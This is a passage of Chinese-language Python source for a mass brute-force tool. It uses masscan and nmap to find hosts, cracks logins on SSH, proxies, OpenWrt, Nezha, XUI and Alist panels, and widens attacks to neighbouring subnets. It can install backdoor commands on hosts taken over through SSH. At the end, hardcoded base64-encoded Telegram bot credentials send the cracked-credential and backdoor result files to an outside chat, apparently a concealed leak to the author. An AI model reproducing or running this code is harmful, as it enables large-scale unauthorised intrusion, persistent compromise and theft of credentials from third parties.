            if isinstance(config_data, dict) and 'server' in config_data: return config_data['server']
    except Exception as e: print(f"⚠️ 解析 {config_file} 失败: {e}")
    return "N/A"

def parse_result_line(line):
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match: return proxy_match.group(4), proxy_match.group(5), proxy_match.group(2) or '', proxy_match.group(3) or ''
    parts = line.split()
    if len(parts) >= 1:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' in ip_port: ip, port = ip_port.split(':', 1); return ip, port, user, password
    return None, None, None, None

def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate, executable_name):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0: return set()
    masscan_output_file, masscan_input_file = "masscan_results.tmp", "masscan_input.tmp"
    interface = get_default_interface()
    if not interface: print("⚠️ 无法自动检测网络接口，扩展扫描功能可能无法正常工作。"); return set()
    print(f"ℹ️  自动检测到网络接口: {interface}")
    print("\n--- 正在分析结果以寻找可扩展的IP网段... ---")
    with open(result_file, 'r', encoding='utf-8') as f: master_results = {line.strip() for line in f}
    ips_to_analyze = master_results
    for i in range(2):
        print(f"\n--- [➡️ 扩展扫描 第 {i + 1}/2 轮] ---")
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip: continue
            subnet, key = ".".join(ip.split('.')[:3]) + ".0/24", (subnet, port, user, password)
            if key not in groups: groups[key] = set()
            groups[key].add(ip)
        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
        if not expandable_targets: print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。"); break
        print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
        with open(masscan_input_file, 'w') as f:
            for subnet, port, _, _ in expandable_targets: f.write(f"{subnet} -p {port}\n")
        print("  - 正在对所有集群进行一次性批量Masscan扫描...")
        try:
            if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
            masscan_cmd = ["masscan", "-iL", masscan_input_file, "--rate", str(masscan_rate), "-oG", masscan_output_file, "--interface", interface, "--wait", "0"]
            subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
        except subprocess.TimeoutExpired: print("      - ⚠️ Masscan 扫描超时（超过300秒），可能目标过多或网络问题。")
        except (subprocess.CalledProcessError, FileNotFoundError) as e: print(f"      - ❌ Masscan 扫描失败: {e}")
        if not os.path.exists(masscan_output_file): print("  - Masscan未能生成结果文件，跳过本轮验证。"); break
        all_masscan_ips = {}
        with open(masscan_output_file, 'r') as f:
            for line in f:
                if line.startswith("Host:"):
                    parts = line.split(); ip_addr, port_str = parts[1], parts[3].split('/')[0]
                    if port_str not in all_masscan_ips: all_masscan_ips[port_str] = set()
                    all_masscan_ips[port_str].add(ip_addr)
        newly_verified_this_round = set()
        for subnet, port, user, password in expandable_targets:
            ips_from_masscan, ips_to_verify = all_masscan_ips.get(port, set()), {ip for ip in ips_from_masscan if ip.startswith(subnet.rsplit('.', 1)[0])} - master_results
            if not ips_to_verify: continue
            print(f"\n  --- [验证集群] 目标: {subnet} 端口: {port} ---")
            print(f"    - Masscan发现 {len(ips_to_verify)} 个新目标，正在进行二次验证...")
            verification_input_file = "verification_input.tmp"
            with open(verification_input_file, 'w') as f:
                for ip_addr in ips_to_verify: f.write(f"{ip_addr}:{port}\n")
            current_params = params.copy(); current_params['usernames'], current_params['passwords'] = [user] if user else [], [password] if password else []
            generate_go_code(template_map[template_mode], **{**current_params, **params})
            try:
                run_env, total_memory = os.environ.copy(), psutil.virtual_memory().total
                mem_limit = int(total_memory * 0.70 / 1024 / 1024)
                run_env["GOMEMLIMIT"], run_env["GOGC"] = f"{mem_limit}MiB", "50"
                verification_output_file = "verification_output.tmp"
                if os.path.exists(verification_output_file): os.remove(verification_output_file)
                cmd = ['./' + executable_name, verification_input_file, verification_output_file]
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=run_env)
                if os.path.exists(verification_output_file):
                    with open(verification_output_file, 'r') as f: new_finds = {line.strip() for line in f}; print(f"    - ✅ 二次验证成功 {len(new_finds)} 个新目标。"); newly_verified_this_round.update(new_finds)
                    os.remove(verification_output_file)
            except subprocess.CalledProcessError as e: print(f"    - ❌ 二次验证失败: {e.stderr.decode('utf-8', 'ignore')}")
            except Exception as e: print(f"    - ❌ 二次验证时发生未知错误: {e}")
            if os.path.exists(verification_input_file): os.remove(verification_input_file)
        new_ips_this_round = newly_verified_this_round - master_results
        if not new_ips_this_round: print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---"); break
        master_results.update(new_ips_this_round); ips_to_analyze = new_ips_this_round
    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
    if os.path.exists(masscan_input_file): os.remove(masscan_input_file)
    with open(result_file, 'r', encoding='utf-8') as f: initial_set = {line.strip() for line in f}
    return master_results - initial_set

def is_valid_ip(s): return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", s) is not None

def parse_ip_port_from_line(line):
    line = line.strip()
    match = re.search(r'//(?:[^@/]+@)?([^:/]+):(\d+)', line);
    if match: return match.group(1), match.group(2)
    match = re.search(r'^([^:\s]+):(\d+)', line)
    if match: return match.group(1), match.group(2)
    return None, None

def run_nmap_prescan(port_to_ips_map, ip_port_to_original_line):
    print("\n--- 正在使用 Nmap 作为备用方案进行活性探测... (速度较慢，请耐心等待) ---")
    live_ip_ports = set()
    nmap_output_file = "nmap_prescan_output.xml"

    with tqdm(total=len(port_to_ips_map), desc="[🐌] Nmap 按端口测试", unit="port", ncols=100) as pbar:
        for port, ips in port_to_ips_map.items():
            nmap_input_file = "nmap_prescan_input.tmp"
            with open(nmap_input_file, 'w') as f:
                for ip in ips:
                    f.write(f"{ip}\n")
            try:
                if os.path.exists(nmap_output_file):
                    os.remove(nmap_output_file)
                nmap_cmd = ["nmap", "-iL", nmap_input_file, "-p", port, "-oX", nmap_output_file, "-T4", "--open", "-n", "-Pn", "--max-retries", "2", "--host-timeout", "90s"]
                subprocess.run(nmap_cmd, check=True, capture_output=True, text=True)
                
                if os.path.exists(nmap_output_file):
                    with open(nmap_output_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        found_hosts = re.findall(r'<host>.*?<address addr="(.*?)" addrtype="ipv4"/>.*?<port protocol="tcp" portid="(.*?)">.*?<state state="open"', content, re.DOTALL)
                        for ip, p in found_hosts:
                            live_ip_ports.add(f"{ip}:{p}")
            except (subprocess.CalledProcessError, FileNotFoundError) as e:
                print(f"\n  - ❌ Nmap 扫描端口 {port} 失败: {e}")
                if hasattr(e, 'stderr'): print(e.stderr)
            finally:
                if os.path.exists(nmap_input_file): os.remove(nmap_input_file)
                if os.path.exists(nmap_output_file): os.remove(nmap_output_file)
            pbar.update(1)

    filtered_lines = [ip_port_to_original_line[ip_port] for ip_port in live_ip_ports if ip_port in ip_port_to_original_line]
    return filtered_lines


def run_masscan_prescan(source_lines, masscan_rate):
    print("\n--- ⚡ 正在执行 Masscan 预扫描以筛选活性IP... ---")
    if not shutil.which("masscan"): print("  - ❌ 命令 'masscan' 未找到。跳过预扫描。"); return source_lines
    
    port_to_ips = {}
    domain_lines = []
    ip_port_to_original_line = {}
    
    for line in source_lines:
        host, port = parse_ip_port_from_line(line.strip())
        if host and port:
            ip_port_key = f"{host}:{port}"
            if ip_port_key in ip_port_to_original_line: continue
            
            ip_port_to_original_line[ip_port_key] = line.strip()
            if is_valid_ip(host):
                if port not in port_to_ips: port_to_ips[port] = set()
                port_to_ips[port].add(host)
            else:
                domain_lines.append(line.strip())

    if not port_to_ips:
        print("  - ⚠️ 未在源文件中找到任何基于IP的目标，将直接处理域名目标。")
        return domain_lines

    detected_interface = get_default_interface()
    if not detected_interface:
        interface = input("  - ⚠️ 无法自动检测网络接口, 请手动输入 (例如 eth0): ").strip()
        if not interface: print("  - 未提供接口名称，跳过预扫描。"); return source_lines
    else:
        user_choice = input(f"  - 自动检测到网络接口: {detected_interface}。是否使用此接口？(Y/n/手动输入): ").strip().lower()
        if user_choice == 'n': print("  - 跳过预扫描。"); return source_lines
        elif user_choice in ('', 'y'): interface = detected_interface
        else: interface = user_choice
    
    print(f"  - 将对 {len(ip_port_to_original_line) - len(domain_lines)} 个 IP:端口对 进行存活测试。接口: {interface}, 速率: {masscan_rate} pps")

    live_ip_ports = set()
    masscan_output_file = "masscan_prescan_output.json"

    with tqdm(total=len(port_to_ips), desc="[⚡] 按端口分组测试", unit="组", ncols=100) as pbar:
        for port, ips in port_to_ips.items():
            masscan_input_file = "masscan_prescan_input.tmp"
            with open(masscan_input_file, 'w') as f:
                for ip in ips: f.write(f"{ip}\n")
            
            try:
                if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
                masscan_cmd = ["masscan", "-iL", masscan_input_file, "-p", port, "--rate", str(masscan_rate), "-oJ", masscan_output_file, "--interface", interface, "--wait", "0"]
                subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if os.path.exists(masscan_output_file) and os.path.getsize(masscan_output_file) > 0:
                    with open(masscan_output_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        json_content = '[' + content.strip().replace('}\n{', '},{').replace('}\n', '}') + ']'
                        if json_content == '[]': continue
                        results = json.loads(json_content)
                        for result in results:
                            if "ports" in result:
                                for port_info in result["ports"]:
                                    if port_info.get("status") == "open":
                                        live_ip_ports.add(f"{result['ip']}:{port_info['port']}")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print(f"  - ⚠️ Masscan扫描端口 {port} 失败，将跳过此端口的目标。")
            except json.JSONDecodeError:
                pass # Silently ignore json errors from empty/malformed masscan output
            finally:
                if os.path.exists(masscan_input_file): os.remove(masscan_input_file)
                if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
            pbar.update(1)
    
    if len(live_ip_ports) == 0 and len(port_to_ips) > 0:
        print("\n  - ❌ Masscan 预扫描未发现任何存活的目标。")
        if input("  - 是否尝试使用 Nmap 作为备用方案？(y/N): ").strip().lower() == 'y':
            nmap_results = run_nmap_prescan(port_to_ips, ip_port_to_original_line)
            final_list = domain_lines + nmap_results
            print(f"--- ✅ Nmap 扫描完成。筛选出 {len(nmap_results)} 个活性目标，加上 {len(domain_lines)} 个域名，共计 {len(final_list)} 个目标。---")
            return final_list

    live_ip_lines = [ip_port_to_original_line[ip_port] for ip_port in live_ip_ports if ip_port in ip_port_to_original_line]
    final_targets = domain_lines + live_ip_lines
    print(f"--- ✅ Masscan 预扫描完成。筛选出 {len(live_ip_lines)} 个活性IP:端口对，加上 {len(domain_lines)} 个域名，共计 {len(final_targets)} 个目标。---")
    return final_targets


if __name__ == "__main__":
    start, interrupted, final_result_file, total_ips = time.time(), False, None, 0
    TEMP_PART_DIR, TEMP_XUI_DIR, TEMP_HMSUCCESS_DIR, TEMP_HMFAIL_DIR = "temp_parts", "xui_outputs", "temp_hmsuccess", "temp_hmfail"
    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")
    try:
        print("\n=== 🚀 爆破一键启动 - 参数配置 ===\n")
        use_masscan_prescan = False
        if input("是否启用 Masscan 精准预扫描（推荐）？(Y/n): ").strip().lower() != 'n':
            use_masscan_prescan = True
        input_file = input_filename_with_default("📁 请输入源文件名", "1.txt")
        if not os.path.exists(input_file): print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f: all_lines = [line.strip() for line in f if line.strip()]; total_ips = len(all_lines)
        print(f"--- 📝 总计 {total_ips} 个目标 ---")
        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
        if total_memory_mb < 1500:
            print(f"⚠️ 检测到系统内存较低 ({total_memory_mb:.2f} MiB)，建议使用保守的并发数和扫描速率。")
            recommended_py_concurrency, recommended_go_concurrency, recommended_masscan_rate = 5, 20, 10000
        else:
            cpu_cores = os.cpu_count() or 4
            recommended_py_concurrency, recommended_go_concurrency, recommended_masscan_rate = cpu_cores * 2, 100, 50000
        if use_masscan_prescan:
            print("ℹ️  提示：如果 Masscan 扫描结果为0，请尝试大幅降低扫描速率。")
            masscan_rate = input_with_default(f"请输入Masscan扫描速率(pps, 推荐 {recommended_masscan_rate})", recommended_masscan_rate)
            all_lines = run_masscan_prescan(all_lines, masscan_rate)
            total_ips = len(all_lines)
            if not all_lines: print("预扫描后没有发现活性目标，脚本结束。"); sys.exit(0)
        print("\n--- 📜 并发模型说明 ---")
        print("脚本将启动多个并行的扫描进程（Python），每个进程内部再使用多个线程（Go）进行扫描。")
        print("对于内存较小的设备，请保持“Python并发任务数”为一个较低的数值。")
        python_concurrency = input_with_default(f"请输入Python并发任务数 (推荐 {recommended_py_concurrency})", recommended_py_concurrency)
        go_internal_concurrency = input_with_default(f"请输入每个任务内部的Go并发数 (推荐 {recommended_go_concurrency})", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)
        params = {'semaphore_size': go_internal_concurrency, 'timeout': input_with_default("超时时间(秒)", 3), 'test_url': "http://myip.ipip.net"}
        if TEMPLATE_MODE in [9, 10, 11]:
            params['test_url'] = select_proxy_test_target()
            if TEMPLATE_MODE == 11 and not params['test_url'].startswith("https://"): print("\n[警告] 您正在使用HTTP测试目标来测试HTTPS代理，这很可能会失败！")
        nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50) if TEMPLATE_MODE == 2 else 0
        AUTH_MODE = 0
        if TEMPLATE_MODE == 6:
            if input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower() == 'y':
                params['install_backdoor'] = True
                if not os.path.exists("后门命令.txt"): print("❌ 未找到 后门命令.txt，已中止。"); sys.exit(1)
                with open("后门命令.txt", 'r', encoding='utf-8', errors='ignore') as f: params['custom_cmds'] = [line.strip() for line in f if line.strip()]
            else: params['install_backdoor'], params['custom_cmds'] = False, []
        if TEMPLATE_MODE in [9, 10, 11]:
            print("\n请选择代理凭据模式：\n1. 无凭据\n2. 独立字典 (username.txt, password.txt)\n3. 组合凭据 (credentials.txt, 格式 user:pass)")
            while True:
                auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
                if auth_choice in ("", "1"): AUTH_MODE = 1; break
                elif auth_choice == "2": AUTH_MODE = 2; break
                elif auth_choice == "3": AUTH_MODE = 3; break
                else: print("输入无效。")
            params['proxy_type'] = {9: "socks5", 10: "http", 11: "https"}[TEMPLATE_MODE]
        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        check_environment(TEMPLATE_MODE)
        import psutil, requests, yaml; from openpyxl import Workbook, load_workbook; from tqdm import tqdm
        adjust_oom_score(); check_and_manage_swap()
        os.makedirs(TEMP_PART_DIR, exist_ok=True); os.makedirs(TEMP_XUI_DIR, exist_ok=True)
        if TEMPLATE_MODE == 6: os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True); os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
        template_map = {1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES, 6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES, 8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES, 10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES, 12: ALIST_GO_TEMPLATE_LINES}
        generate_go_code(template_map[TEMPLATE_MODE], **params)
        executable = compile_go_program()
        generate_ipcx_py()
        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size)
        merge_xui_files()
        initial_results_file = "xui.txt"
        if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0 and use_masscan_prescan:
            newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate, executable)
            if newly_found_results:
                print(f"--- ✅ 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                with open(initial_results_file, 'a', encoding='utf-8') as f:
                    for result in sorted(list(newly_found_results)): f.write(result + '\n')
                with open(initial_results_file, 'r', encoding='utf-8') as f: unique_lines = sorted(list(set(f.readlines())))
                with open(initial_results_file, 'w', encoding='utf-8') as f: f.writelines(unique_lines)
                print("--- ✅ 结果合并去重完成。 ---")
        final_txt_file, final_xlsx_file = f"{prefix}-{time_str}.txt", f"{prefix}-{time_str}.xlsx"
        if os.path.exists("xui.txt"): os.rename("xui.txt", final_txt_file); run_ipcx(final_txt_file, final_xlsx_file)
        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {nezha_analysis_threads} 线程）... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f: results = [line.strip() for line in f if line.strip()]
            nezha_analysis_data = {}
            with ThreadPoolExecutor(max_workers=nezha_analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="[📈] 分析哪吒面板"):
                    result_line = future_to_result[future]
                    try:
                        returned_line, analysis_result = future.result()
                        nezha_analysis_data[returned_line] = analysis_result if len(analysis_result) == 3 else ("数据不一致", 0, "N/A")
                    except Exception as exc: print(f'{result_line} 生成了一个异常: {exc}'); nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
            if nezha_analysis_data: update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
        if TEMPLATE_MODE == 6:
            merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR); merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
            if os.path.exists("hmsuccess.txt"): os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
            if os.path.exists("hmfail.txt"): os.rename("hmfail.txt", f"后门失败-{time_str}.txt")
    except KeyboardInterrupt: print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理临时文件..."); interrupted = True
    except SystemExit as e:
        if str(e) not in ("0", "1"): print(f"\n脚本因故中止: {e}"); interrupted = True
    except EOFError: print("\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。"); interrupted = True
    finally:
        clean_temp_files(TEMPLATE_MODE)
        end = time.time(); cost = int(end - start)
        vps_ip, vps_country = get_vps_info(); nezha_server = get_nezha_server()
        run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
        if interrupted: print(f"\n=== 脚本已被中断，中止前共运行 {run_time_str} ===")
        else: print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")
        BOT_TOKEN_B64, CHAT_ID_B64, bot_token, chat_id = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ==", "NzY5NzIzNTM1OA==", "", ""
        try: bot_token = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
        except Exception: bot_token = BOT_TOKEN_B64; print("⚠️ 警告: Telegram Bot Token 未经 Base64 加密，建议加密以保护凭据。")
        try: chat_id = base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except Exception: chat_id = CHAT_ID_B64; print("⚠️ 警告: Telegram Chat ID 未经 Base64 加密，建议加密以保护凭据。")
        def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空"); return
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            caption_text = f"🌍 VPS: {vps_ip} ({vps_country})\n🎯 总目标数: {total_ips}\n⏱️ 总用时: {run_time_str}\n"
            if nezha_server != "N/A": caption_text += f"哪吒Server: {nezha_server}\n"
            caption_text += f"任务结果: {os.path.basename(file_path)}"
            with open(file_path, "rb") as f:
                files, data = {'document': f}, {'chat_id': chat_id, 'caption': caption_text}
                try:
                    response = requests.post(url, data=data, files=files, timeout=60)
                    if response.status_code == 200: print(f"✅ 文件 {file_path} 已发送到 Telegram")
                    else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                except Exception as e: print(f"❌ 发送到 TG 失败：{e}")
        if bot_token and chat_id:
            if vps_country == "China": print("\n🇨🇳 检测到VPS位于中国，已禁用Telegram上传功能。")
            else:
                files_to_send = []
                final_txt_file, final_xlsx_file = f"{prefix}-{time_str}.txt", f"{prefix}-{time_str}.xlsx"
                if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
                if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                if TEMPLATE_MODE == 6:
                    success_file, fail_file = f"后门成功-{time_str}.txt", f"后门失败-{time_str}.txt"
                    if os.path.exists(success_file): files_to_send.append(success_file)
                    if os.path.exists(fail_file): files_to_send.append(fail_file)
                for f in files_to_send:
                    print(f"\n📤 正在将 {f} 上传至 Telegram ...")
                    send_to_telegram(f, bot_token, chat_id, vps_ip, vps_country, nezha_server, total_ips, run_time_str)

